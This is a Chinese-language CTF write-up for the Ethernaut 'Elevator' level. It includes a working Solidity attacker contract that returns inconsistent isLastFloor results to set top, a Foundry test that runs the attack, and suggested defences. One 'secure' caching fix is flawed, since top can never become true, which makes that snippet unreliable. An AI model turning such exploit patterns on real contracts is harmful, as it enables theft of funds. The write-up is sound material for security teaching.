---
title: 'Ethernaut Level 11: Elevator - 接口实现攻击'
date: 2025-01-25 15:50:00
updated: 2025-01-25 15:50:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - 接口实现攻击
  - 智能合约接口
  - 智能合约安全
  - Solidity
  - 状态操纵
series: Ethernaut Foundry Solutions
excerpt: "深入学习智能合约接口实现攻击，掌握 Elevator 关卡的攻击技术和防护措施。理解接口定义与实现的安全风险。"
---

# 🎯 Ethernaut Level 11: Elevator - 接口实现攻击

> **关卡链接**: [Ethernaut Level 11 - Elevator](https://ethernaut.openzeppelin.com/level/11)  
> **攻击类型**: 接口实现攻击  
> **难度**: ⭐⭐⭐☆☆

## 📋 挑战目标

目的是使电梯达到最顶层，即使题目合约的 `top` 为 `true`。关键在于理解接口定义与实际实现的差别，以及如何利用这个差别进行攻击。

![Elevator Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg)

## 🔍 漏洞分析

### 接口的安全风险

本关卡重在考验我们对智能合约接口的认知程度：
- **接口定义函数签名，但不定义它们的逻辑**
- 这是一种无需知道实现细节就可以与其他合约交互的方法
- 但也意味着攻击者可以控制接口的实现逻辑

### 关键漏洞代码

```solidity
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);  // 第二次调用！
    }
}
```

### 攻击向量

在 `goTo` 函数中，`isLastFloor` 被调用两次：
1. **第一次调用**：必须返回 `false`，否则无法进入修改 `top` 的逻辑
2. **第二次调用**：我们可以让它返回 `true` 来设置 `top = true`

我们可以通过创建一个 `isLastFloor()` 来利用这一点，它将第一次返回 `false`，第二次返回 `true`。

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/ElevatorFactory.sol";

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract ElevatorAttacker is Building {
    Elevator instance;
    bool top = false;

    constructor(address _elevator) {
        instance = Elevator(_elevator);
    }

    // 关键：状态变化的接口实现
    function isLastFloor(uint _floor) external override returns (bool) {
        top = !top;  // 第一次调用时 top 变为 true，第二次变为 false
        return !top; // 第一次返回 false，第二次返回 true
    }

    function attack(uint _floor) public {
        instance.goTo(_floor);
    }
}

contract ElevatorTest is Test {
    Ethernaut ethernaut;
    ElevatorFactory elevatorFactory;
    
    function setUp() public {
        ethernaut = new Ethernaut();
        elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
    }
    
    function testElevatorExploit() public {
        // 创建关卡实例
        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);
        Elevator instance = Elevator(levelInstance);
        
        // 检查初始状态
        assertEq(instance.top(), false);
        assertEq(instance.floor(), 0);
        
        // 部署攻击合约
        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);
        
        // 执行攻击
        attacker.attack(1);
        
        // 验证攻击成功
        assertEq(instance.top(), true);
        assertEq(instance.floor(), 1);
        
        // 提交关卡
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelInstance)
        );
        assert(levelSuccessfullyPassed);
    }
}
```

### 关键攻击步骤

1. **实现 Building 接口**：创建一个合约实现 `Building` 接口
2. **状态变化逻辑**：在 `isLastFloor()` 中实现状态变化
3. **调用 goTo 函数**：通过攻击合约调用 `goTo()`
4. **验证结果**：检查 `top` 是否为 `true`

```solidity
// 状态变化的关键实现
function isLastFloor(uint _floor) external override returns (bool) {
    top = !top;  // 切换状态
    return !top; // 第一次返回 false，第二次返回 true
}
```

## 🛡️ 防御措施

### 1. 避免多次调用外部函数

```solidity
// ❌ 不安全：多次调用外部函数
contract VulnerableElevator {
    function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        
        if (!building.isLastFloor(_floor)) {  // 第一次调用
            floor = _floor;
            top = building.isLastFloor(floor);  // 第二次调用！
        }
    }
}

// ✅ 安全：只调用一次并缓存结果
contract SecureElevator {
    function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        
        bool isLast = building.isLastFloor(_floor);  // 只调用一次
        
        if (!isLast) {
            floor = _floor;
            top = isLast;  // 使用缓存的结果
        }
    }
}
```

### 2. 使用 view 函数

```solidity
// ✅ 使用 view 函数防止状态改变
interface Building {
    function isLastFloor(uint) external view returns (bool);  // view 修饰符
}

contract SecureElevator {
    function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);  // view 函数保证一致性
        }
    }
}
```

### 3. 使用白名单机制

```solidity
contract SecureElevator {
    mapping(address => bool) public approvedBuildings;
    address public owner;
    
    modifier onlyApprovedBuilding() {
        require(approvedBuildings[msg.sender], "Unauthorized building");
        _;
    }
    
    function addApprovedBuilding(address building) public {
        require(msg.sender == owner);
        approvedBuildings[building] = true;
    }
    
    function goTo(uint _floor) public onlyApprovedBuilding {
        // 安全逻辑
    }
}
```

### 4. 实现内部逻辑

```solidity
contract SecureElevator {
    uint public floor;
    bool public top;
    uint public topFloor = 10;  // 定义最高层
    
    function goTo(uint _floor) public {
        require(_floor <= topFloor, "Floor too high");
        
        floor = _floor;
        top = (_floor == topFloor);  // 内部判断逻辑
    }
}
```

## 🔧 相关工具和技术

### 接口安全检测

```solidity
// 检测接口实现的一致性
contract InterfaceChecker {
    function checkConsistency(address building, uint floor) public {
        Building b = Building(building);
        
        // 多次调用检查一致性
        bool result1 = b.isLastFloor(floor);
        bool result2 = b.isLastFloor(floor);
        
        require(result1 == result2, "Inconsistent interface implementation");
    }
}
```

### 合约分析工具

```bash
# 使用 Slither 检测接口安全问题
slither . --detect external-function

# 使用 Mythril 分析
Myth analyze <contract.sol> --execution-timeout 60
```

## 🎯 总结

**核心概念**:
- 接口是一种无需知道实现细节就可以与其他合约交互的方式
- 但永远不要盲目相信它们！
- 多次调用外部函数可能产生不一致的结果

**攻击向量**:
- 实现恶意的接口逻辑
- 利用多次调用之间的状态变化
- 操纵函数返回值以达到攻击目的

**防御策略**:
- 只调用一次外部函数并缓存结果
- 使用 `view` 函数修饰符防止状态改变
- 实现白名单机制控制访问
- 尽可能使用内部逻辑而不依赖外部实现

